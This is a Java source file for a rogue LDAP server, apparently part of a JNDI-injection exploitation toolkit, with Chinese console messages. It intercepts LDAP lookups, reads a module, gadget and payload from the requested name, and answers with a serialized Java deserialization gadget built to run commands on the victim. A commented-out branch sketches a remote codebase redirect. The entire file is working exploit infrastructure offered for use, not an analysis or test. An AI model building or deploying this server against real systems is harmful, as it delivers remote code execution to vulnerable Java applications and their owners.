package sonomon.server;

import java.net.InetAddress;
import java.net.URL;
import java.util.Arrays;
import java.util.List;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import sonomon.deser.*;

import sonomon.Config;


public class LdapServer {
    private static final String LDAP_BASE = "dc=example,dc=com";
    private static  String module = "";
    private static  String gadget = "";
    private static  String payload = "";
    
    
	public static InMemoryDirectoryServer start() throws Exception {

		InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                Config.ldapport,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));
        config.addInMemoryOperationInterceptor(new OperationInterceptor());
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("[+] Listening on 0.0.0.0:" + Config.ldapport);
        try {
        	ds.startListening();
		} catch (Exception e) {
			System.out.println("[*] 启动失败，可能是端口被占用"+"\r\n");
			System.out.println(e);
		}
        return ds;
        

		
}

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        public OperationInterceptor () {
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch (Exception e1) {
                e1.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {
        	e.addAttribute("javaClassName", "foo");
        	echo(base);
        	List list = Arrays.asList(base.split("\\:"));
        	if (list.size() == 3) {	
            	module = (String) list.get(0);
            	gadget = (String) list.get(1);
            	payload = (String) list.get(2);
            	switch (module) {
    			case "deser":
    				e.addAttribute("javaSerializedData", Deserialize.getjavaSerializedData(gadget, payload));  
    				break;
    			default:
    				System.out.println("[*] ldap url 错误!\r\n");
    				break;
    			}
        	} else {
	            URL turl = new URL(Config.url+base+".class");
				echo(base, turl);
				System.out.println("[*] 暂时不支持JNDI注入");
//                e.addAttribute("javaCodeBase", Config.url);
//                e.addAttribute("objectClass", "javaNamingReference");
//                e.addAttribute("javaFactory", base);
			}

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
        protected void echo(String base) {
			System.out.println("[+] Send LDAP reference result to "+base);
		}
        protected void echo(String base, URL method) {
			System.out.println("[+] Send LDAP reference result for " + base + " redirecting to "+method);
		}
    }
}
